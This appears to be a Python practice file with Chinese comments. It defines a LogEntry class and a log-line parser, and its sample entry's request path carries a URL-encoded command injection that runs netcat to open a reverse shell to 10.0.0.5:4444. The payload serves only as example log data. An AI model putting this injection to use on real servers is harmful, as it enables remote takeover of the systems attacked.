# 2026-09-26 | W4-D3 | 已验收 | 覆盖边界：LogEntry 类 + 日志行解析
# 【9/22 实测结论 · 代码已覆盖，结论保留】
# 类属性为不可变对象 + 实例赋值 → 只在该实例上造属性（shadow）
# 类属性为可变对象 + 就地修改 → 影响所有实例（id(b1.history) == id(b2.history) → True）

class LogEntry:
        def __init__(self, time, ip, method,path,status):
            self.time = time
            self.ip = ip
            self.method = method
            self.path = path
            self.status = status

        def summary(self):
            return f"IP:{self.ip}|time:{self.time}|method:{self.method}|path:{self.path}|status:{self.status}"

        def __str__(self):
            return self.summary()  # ← 注意这里


    # 把 LogEntry类+属性.py 里的类体搬过来（含 summary / __str__）



def parse_line(line):
    # 一行文本 → LogEntry 对象
    # 日志格式自己定，例如：192.168.1.1 2023-04-01T12:00:00 UNKNOWN
    parts = line.split()
    return LogEntry(time = parts[0], ip = parts[1], method = parts[2], path = parts[3], status = parts[4])

#
if __name__ == "__main__":
        e = LogEntry("2026-09-20T08:08:22", "203.0.113.45", "GET", "/convert.php?f=test.pdf%3B%20nc%20-e%20/bin/sh%2010.0.0.5%204444", "403")

        print(e.summary())
        print(e)